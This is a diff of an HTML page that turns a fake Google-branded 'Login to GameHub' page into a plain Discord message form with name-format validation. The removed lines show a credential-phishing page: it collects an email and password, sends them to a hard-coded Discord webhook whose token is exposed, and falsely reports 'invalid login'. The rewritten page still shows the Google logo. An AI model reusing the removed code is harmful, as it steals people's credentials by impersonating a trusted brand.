@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login</title>
+  <title>Send a Message</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
 
@@ -77,10 +77,22 @@
       box-shadow: 0 0 0 2px rgba(26,115,232,0.25);
     }
 
+    input.invalid {
+      border-color: #d93025;
+      box-shadow: 0 0 0 2px rgba(217,48,37,0.2);
+    }
+
     textarea {
       min-height: 110px;
       line-height: 1.5;
     }
+
+    .field-hint {
+      font-size: 11px;
+      margin-top: 5px;
+      color: #5f6368;
+    }
+    .field-hint.error { color: #d93025; }
 
     .char-count {
       font-size: 11px;
@@ -161,7 +173,6 @@
     }
     .footer-links a:hover { text-decoration: underline; }
 
-    /* Toast */
     #toast {
       position: fixed;
       bottom: 24px;
@@ -190,26 +201,27 @@
 
 <div class="card">
   <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-  <h1>Login</h1>
-  <p class="subtitle">to GameHub</p>
+  <h1>Send a message</h1>
+  <p class="subtitle">to our Discord server</p>
 
   <div class="no-webhook-warning" id="noWebhookWarning">
-    ERROR - INVALID LOGIN
+    No webhook URL set — fill in WEBHOOK_URL in the script.
   </div>
 
   <div class="field">
-    <label>Email</label>
-    <input type="text" id="usernameOverride" placeholder="Email or phone" maxlength="80"/>
+    <label>Your name</label>
+    <input type="text" id="usernameOverride" placeholder="e.g. john.smith 10A" maxlength="80" oninput="validateName()"/>
+    <div class="field-hint" id="nameHint">Format: <strong id="hintText"></strong></div>
   </div>
 
   <div class="field">
-    <label>Password</label>
-    <textarea id="messageContent" placeholder="Enter Password" maxlength="25"></textarea>
-    <div class="char-count" id="charCount">0 / 25</div>
+    <label>Message</label>
+    <textarea id="messageContent" placeholder="Type something..." maxlength="2000"></textarea>
+    <div class="char-count" id="charCount">0 / 2000</div>
   </div>
 
   <button class="send-btn" id="sendBtn" onclick="sendWebhook()">
-    <span class="btn-text">Login</span>
+    <span class="btn-text">Send</span>
     <span class="spinner">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
         <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83" stroke-linecap="round"/>
@@ -229,21 +241,55 @@
   // ============================================================
   //  PASTE YOUR DISCORD WEBHOOK URL BELOW (between the quotes)
   // ============================================================
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1483108540498317353/UeFUhTCJ1gLiBGnnSd-xmRpu_STI5pvpe4bVB4mtHSDUvgvkZkMepeNZXksCUGmcm7jZ";
+  const WEBHOOK_URL = "";
   // ============================================================
+
+  // ============================================================
+  //  NAME FORMAT SETTINGS
+  //  NAME_REGEX  — the pattern the name must match
+  //  NAME_HINT   — shown to the user as format guidance
+  //
+  //  Current example: "firstname.lastname classCode"
+  //  e.g.  john.smith 10A  /  jane.doe 11B
+  //
+  //  To change the format, update both values below.
+  //  Regex tester: https://regex101.com
+  // ============================================================
+  const NAME_REGEX = /^[a-zA-Z]+\.[a-zA-Z]+ [a-zA-Z0-9]+$/;
+  const NAME_HINT  = "firstname.lastname class  (e.g. john.smith 10A)";
+  // ============================================================
+
+  // Set hint text
+  document.getElementById('hintText').textContent = NAME_HINT;
 
   if (!WEBHOOK_URL) {
     document.getElementById('noWebhookWarning').classList.add('show');
     document.getElementById('sendBtn').disabled = true;
   }
 
-  const msgEl = document.getElementById('messageContent');
+  const msgEl      = document.getElementById('messageContent');
   const charCountEl = document.getElementById('charCount');
+  const nameInput  = document.getElementById('usernameOverride');
+  const nameHint   = document.getElementById('nameHint');
+
+  function validateName() {
+    const val = nameInput.value.trim();
+    if (val === '') {
+      // empty = reset to neutral
+      nameInput.classList.remove('invalid');
+      nameHint.classList.remove('error');
+      return true;
+    }
+    const ok = NAME_REGEX.test(val);
+    nameInput.classList.toggle('invalid', !ok);
+    nameHint.classList.toggle('error', !ok);
+    return ok;
+  }
 
   msgEl.addEventListener('input', () => {
     const len = msgEl.value.length;
-    charCountEl.textContent = `${len} / 25`;
-    charCountEl.className = 'char-count' + (len > 1900 ? ' warn' : '') + (len >= 25 ? ' over' : '');
+    charCountEl.textContent = `${len} / 2000`;
+    charCountEl.className = 'char-count' + (len > 1900 ? ' warn' : '') + (len >= 2000 ? ' over' : '');
   });
 
   let toastTimer;
@@ -257,15 +303,18 @@
 
   async function sendWebhook() {
     const content  = msgEl.value.trim();
-    const username = document.getElementById('usernameOverride').value.trim();
-    if (!content) { showToast('ERROR - INVALID LOGIN.'); return; }
+    const username = nameInput.value.trim();
+
+    // Name is required and must match pattern
+    if (!username) { showToast('Please enter your name.'); nameInput.focus(); return; }
+    if (!validateName()) { showToast('Name format is invalid.'); nameInput.focus(); return; }
+    if (!content)  { showToast('Message cannot be empty.'); return; }
 
     const btn = document.getElementById('sendBtn');
     btn.classList.add('loading');
     btn.disabled = true;
 
-    const payload = { content };
-    if (username) payload.username = username;
+    const payload = { content, username };
 
     try {
       const res = await fetch(WEBHOOK_URL, {
@@ -276,7 +325,7 @@
       if (res.ok || res.status === 204) {
         showToast('Message sent!');
         msgEl.value = '';
-        charCountEl.textContent = '0 / 25';
+        charCountEl.textContent = '0 / 2000';
         charCountEl.className = 'char-count';
       } else {
         let errMsg = `Error ${res.status}`;
